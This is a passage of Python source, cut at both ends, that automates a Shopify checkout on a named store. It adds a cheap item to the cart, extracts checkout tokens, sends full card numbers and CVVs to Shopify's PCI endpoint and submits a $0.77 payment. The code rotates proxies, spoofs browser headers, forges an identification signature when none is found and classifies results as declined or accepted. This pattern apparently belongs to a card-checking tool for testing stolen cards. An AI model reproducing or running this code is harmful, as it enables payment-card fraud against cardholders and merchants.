            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("SESSION_INIT", str(e))
            return False, f"Session init error: {str(e)[:50]}"

    # ========== STEP 1: Visit Product Page ==========
    async def visit_product_page(self):
        """Step 1: Visit product page to set product cookies"""
        self.step(1, "VISIT PRODUCT", f"Visiting: {self.base_url}/products/{self.product_handle}")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
            'referer': self.base_url,
        }
        
        try:
            resp = await self.client.get(
                f"{self.base_url}/products/{self.product_handle}",
                headers=headers,
                timeout=25,
                follow_redirects=True
            )
            self._update_cookies_from_response(resp)
            
            if resp.status_code == 200:
                self.logger.data_extracted("Product Page", "Loaded", "Store")
                return True, "PRODUCT_VISITED"
            return False, f"Product page failed: {resp.status_code}"
            
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on product page: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on product page: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PRODUCT_PAGE", str(e))
            return False, f"Product page error: {str(e)[:50]}"

    # ========== STEP 2: Add to Cart ==========
    async def add_to_cart(self):
        """Step 2: Add product to cart via /cart/add"""
        self.step(2, "ADD TO CART", f"Adding variant {self.variant_id} to cart")
        
        headers = {
            'accept': 'application/javascript',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary' + self.generate_random_string(16),
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/products/{self.product_handle}',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # Build form data
        boundary = headers['content-type'].split('boundary=')[1]
        body_parts = []
        form_fields = [
            ('quantity', '1'),
            ('form_type', 'product'),
            ('utf8', '✓'),
            ('id', self.variant_id),
            ('product-id', self.product_id),
            ('section-id', 'template--14796746227799__main'),
            ('sections', 'cart-drawer,cart-icon-bubble'),
            ('sections_url', f'/products/{self.product_handle}'),
        ]
        
        for name, value in form_fields:
            body_parts.append(f'--{boundary}')
            body_parts.append(f'Content-Disposition: form-data; name="{name}"')
            body_parts.append('')
            body_parts.append(value)
        body_parts.append(f'--{boundary}--')
        
        body = '\r\n'.join(body_parts)
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart/add",
                headers=headers,
                content=body,
                timeout=25,
                follow_redirects=True
            )
            self._update_cookies_from_response(resp)
            
            if resp.status_code == 200:
                self.logger.data_extracted("Cart Token", self.cart_token or "None", "Add to Cart")
                return True, "ADDED_TO_CART"
            return False, f"Add to cart failed: {resp.status_code}"
            
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on add to cart: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on add to cart: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("ADD_TO_CART", str(e))
            return False, f"Add to cart error: {str(e)[:50]}"

    # ========== STEP 3: Start Checkout (POST /cart) ==========
    async def start_checkout(self):
        """Step 3: POST /cart to get redirected to checkout page - CRITICAL for getting checkout token"""
        self.step(3, "START CHECKOUT", "POST /cart to initiate checkout redirect")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
            'priority': 'u=0, i',
            'referer': f'{self.base_url}/products/{self.product_handle}',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        
        # The checkout payload
        data = 'updates%5B%5D=1&checkout='
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart",
                headers=headers,
                content=data,
                timeout=25,
                follow_redirects=True
            )
            self._update_cookies_from_response(resp)
            
            # Get final URL from redirects - this contains the checkout token
            current_url = str(resp.url)
            self.checkout_token = self.extract_checkout_token(current_url)
            
            if self.checkout_token:
                self.logger.data_extracted("Checkout Token", self.checkout_token, "Checkout Redirect URL")
                self.graphql_session_token = self.construct_graphql_session_token()
                self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
                return True, current_url
            else:
                # Try extracting from html
                html = resp.text
                token = self.extract_checkout_token(html)
                if token:
                    self.checkout_token = token
                    self.graphql_session_token = self.construct_graphql_session_token()
                    return True, current_url
                    
                self.logger.error_log("CHECKOUT_TOKEN", "No token found in response")
                return False, "CHECKOUT_TOKEN_ERROR"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on checkout start: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on checkout start: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("START_CHECKOUT", str(e))
            return False, f"Checkout start error: {str(e)[:50]}"

    # ========== STEP 4: Get Checkout Page & Extract Tokens ==========
    async def get_checkout_page(self):
        """Step 4: GET checkout page to extract session token, signature, queue token, stable ID"""
        self.step(4, "GET CHECKOUT PAGE", "Loading checkout page and extracting tokens")
        
        checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true"
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': self.base_url,
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        
        try:
            resp = await self.client.get(
                checkout_url,
                headers=headers,
                timeout=25,
                follow_redirects=True
            )
            self._update_cookies_from_response(resp)
            
            if resp.status_code != 200:
                return False, f"Checkout page failed: {resp.status_code}"
            
            html = resp.text
            
            # Extract session token (CRITICAL)
            self.session_token = self.extract_session_token_from_html(html)
            if self.session_token:
                self.logger.data_extracted("Session Token", self.session_token[:30] + "...", "Checkout HTML")
            else:
                self.logger.error_log("SESSION_TOKEN", "Could not extract session token from HTML")
                return False, "SESSION_TOKEN_ERROR"
            
            # Extract signature for PCI
            self.signature = self.extract_signature_from_html(html)
            if self.signature:
                self.logger.data_extracted("PCI Signature", self.signature[:30] + "...", "Checkout HTML")
            
            # Extract queue token
            self.queue_token = self.extract_queue_token_from_html(html)
            if self.queue_token:
                self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Checkout HTML")
            
            # Extract or generate stable ID
            self.stable_id = self.extract_stable_id_from_html(html)
            if not self.stable_id:
                self.stable_id = self.generate_uuid()
            self.logger.data_extracted("Stable ID", self.stable_id, "Checkout HTML")
            
            return True, html
            
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on checkout page: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on checkout page: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("CHECKOUT_PAGE", str(e))
            return False, f"Checkout page error: {str(e)[:50]}"

    # ========== STEP 5: Submit Initial Proposal (with email) ==========
    async def submit_initial_proposal(self):
        """Step 5: Submit Proposal with email to get queue token and validation errors"""
        self.step(5, "SUBMIT INITIAL PROPOSAL", f"Setting email: {self.email}")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shopmiddleeastern.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.ua,
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token,
        }
        
        # Variables for initial proposal
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": f"A{self.generate_random_string(43)}==",
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": {
                                "latitude": 28.6327,
                                "longitude": 77.2198
                            },
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.delivery_strategy_handle,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {
                        "lines": [{"stableId": self.stable_id}]
                    },
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {
                        "value": {"amount": "0.00", "currencyCode": "USD"}
                    },
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 1}
                    },
                    "expectedTotalPrice": {
                        "value": {"amount": "0.75", "currencyCode": "USD"}
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {
                "memberships": []
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "city": "",
                        "countryCode": "US",
                        "lastName": "",
                        "phone": ""
                    }
                }
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": True,
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "includeTaxStrategyLines": False
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Proposal failed: {resp.status_code}"
            
            try:
                proposal_resp = resp.json()
                
                if 'errors' in proposal_resp and proposal_resp['errors']:
                    error_msgs = []
                    for error in proposal_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    
                    if any(code in ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'PAYMENTS_FIRST_NAME_REQUIRED', 
                                    'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_ADDRESS1_REQUIRED', 
                                    'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED', 
                                    'PAYMENTS_CITY_REQUIRED', 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT'] for code in error_msgs):
                        self.logger.data_extracted("Proposal", f"Expected validation errors: {', '.join(error_msgs)}", "Expected")
                        
                        # Extract queue token
                        data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                        new_queue_token = data.get('queueToken')
                        if new_queue_token:
                            self.queue_token = new_queue_token
                            self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal response")
                        
                        return True, "VALIDATION_ERRORS"
                    
                    return False, f"DECLINED - {', '.join(error_msgs)}"
                
                # Extract queue token
                data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal response")
                    return True, self.queue_token
                
                return True, "PROPOSAL_SUCCESS"
                
            except Exception as e:
                return False, f"Failed to parse proposal response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on proposal: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on proposal: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PROPOSAL_ERROR", str(e))
            return False, f"Proposal error: {str(e)[:50]}"

    # ========== STEP 6: Submit Proposal with Billing Address & Card BIN ==========
    async def submit_billing_proposal(self, cc, payment_session_id):
        """Step 6: Submit Proposal with billing address and card BIN (first 8 digits)"""
        self.step(6, "SUBMIT BILLING PROPOSAL", f"Setting billing: {self.address['address1']}, {self.address['city']}, {self.address['provinceCode']} {self.address['zip']}")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shopmiddleeastern.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.ua,
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token,
        }
        
        # Clean card number and get BIN (first 8 digits)
        card_number = cc.replace(" ", "").replace("-", "")
        card_bin = card_number[:8] if len(card_number) >= 8 else card_number
        
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token,
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": {
                                "latitude": 28.6327,
                                "longitude": 77.2198
                            },
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.delivery_strategy_handle,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {
                        "lines": [{"stableId": self.stable_id}]
                    },
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {
                        "value": {"amount": "0.00", "currencyCode": "USD"}
                    },
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 1}
                    },
                    "expectedTotalPrice": {
                        "value": {"amount": "0.75", "currencyCode": "USD"}
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": self.address["address1"],
                        "address2": self.address["address2"],
                        "city": self.address["city"],
                        "countryCode": self.address["countryCode"],
                        "postalCode": self.address["zip"],
                        "firstName": self.first_name,
                        "lastName": self.last_name,
                        "zoneCode": self.address["provinceCode"],
                        "phone": ""
                    }
                },
                "creditCardBin": card_bin
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": False,
                "phoneCountryCode": "US",
                "marketingConsent": [
                    {"email": {"consentState": "DECLINED", "value": self.email}}
                ],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "includeTaxStrategyLines": False
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Billing proposal failed: {resp.status_code}"
            
            try:
                billing_resp = resp.json()
                
                # Check for errors
                if 'errors' in billing_resp and billing_resp['errors']:
                    error_msgs = []
                    for error in billing_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    
                    if 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT' in error_msgs:
                        # This is expected sometimes, continue anyway
                        self.logger.data_extracted("Billing Proposal", f"Expected: {', '.join(error_msgs)}", "Expected")
                    else:
                        return False, f"DECLINED - {', '.join(error_msgs)}"
                
                # Extract new queue token
                data = billing_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Billing proposal")
                
                return True, "BILLING_PROPOSAL_SUCCESS"
                
            except Exception as e:
                return False, f"Failed to parse billing response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on billing proposal: {str(e)}")
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on billing proposal: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("BILLING_PROPOSAL", str(e))
            return False, f"Billing proposal error: {str(e)[:50]}"

    # ========== STEP 7: Create PCI Payment Session ==========
    async def create_payment_session(self, cc, mes, ano, cvv):
        """Step 7: Create payment session with PCI Shopify"""
        self.step(7, "CREATE PAYMENT SESSION", "Creating PCI payment session")
        
        pci_headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': f'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'user-agent': self.ua,
        }
        
        # Use the extracted signature or generate one
        if self.signature:
            pci_headers['shopify-identification-signature'] = self.signature
        else:
            # Generate signature
            header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
            payload_data = {
                "client_id": "2",
                "client_account_id": self.shop_id,
                "unique_id": self.checkout_token,
                "iat": int(time.time())
            }
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
            signature = self.generate_random_string(43)
            shopify_signature = f"{header}.{payload_b64}.{signature}"
            pci_headers['shopify-identification-signature'] = shopify_signature
        
        # Format card details
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        month_int = int(mes)
        
        # PCI payload
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": month_int,
                "year": int(year_full),
                "verification_value": cvv,
                "name": self.full_name,
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": "shopmiddleeastern.com"
        }
        
        try:
            resp = await self.client.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=pci_headers,
                json=pci_payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"PCI session failed: {resp.status_code}"
            
            try:
                pci_resp = resp.json()
                payment_session_id = pci_resp.get('id')
                if not payment_session_id:
                    return False, "No payment session ID returned"
                
                self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
                return True, payment_session_id
                
            except Exception as e:
                return False, f"Failed to parse PCI response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on PCI: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e))
            return False, "PCI_ERROR"

    # ========== STEP 8: Submit For Completion ==========
    async def submit_for_completion(self, cc, payment_session_id):
        """Step 8: SubmitForCompletion - final payment submission"""
        self.step(8, "SUBMIT PAYMENT", "Finalizing payment of 0.77$")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shopmiddleeastern.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.ua,
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token,
        }
        
        # Get card BIN
        card_number = cc.replace(" ", "").replace("-", "")
        card_bin = card_number[:8] if len(card_number) >= 8 else card_number
        
        # Generate attempt token
        attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
        
        variables = {
            "input": {
                "sessionInput": {
                    "sessionToken": self.graphql_session_token
                },
                "queueToken": self.queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "geolocation": {
                                "coordinates": {
                                    "latitude": 28.6327,
                                    "longitude": 77.2198
                                },
                                "countryCode": "US"
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": self.delivery_strategy_handle,
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": self.stable_id}]
                        },
                        "deliveryMethodTypes": ["PICK_UP"],
                        "expectedTotalPrice": {
                            "value": {"amount": "0.00", "currencyCode": "USD"}
                        },
                        "destinationChanged": True
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": []
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {
                            "items": {"value": 1}
                        },
                        "expectedTotalPrice": {
                            "value": {"amount": "0.75", "currencyCode": "USD"}
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": self.payment_method_identifier,
                                "sessionId": payment_session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": self.address["address1"],
                                        "address2": self.address["address2"],
                                        "city": self.address["city"],
                                        "countryCode": self.address["countryCode"],
                                        "postalCode": self.address["zip"],
                                        "firstName": self.first_name,
                                        "lastName": self.last_name,
                                        "zoneCode": self.address["provinceCode"],
                                        "phone": ""
                                    }
                                },
                                "cardSource": None
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None
                        },
                        "amount": {
                            "value": {
                                "amount": "0.77",
                                "currencyCode": "USD"
                            }
                        }
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": self.address["address1"],
                            "address2": self.address["address2"],
                            "city": self.address["city"],
                            "countryCode": self.address["countryCode"],
                            "postalCode": self.address["zip"],
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": self.address["provinceCode"],
                            "phone": ""
                        }
                    },
                    "creditCardBin": card_bin
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "email": self.email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [
                        {"email": {"consentState": "DECLINED", "value": self.email}}
                    ],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
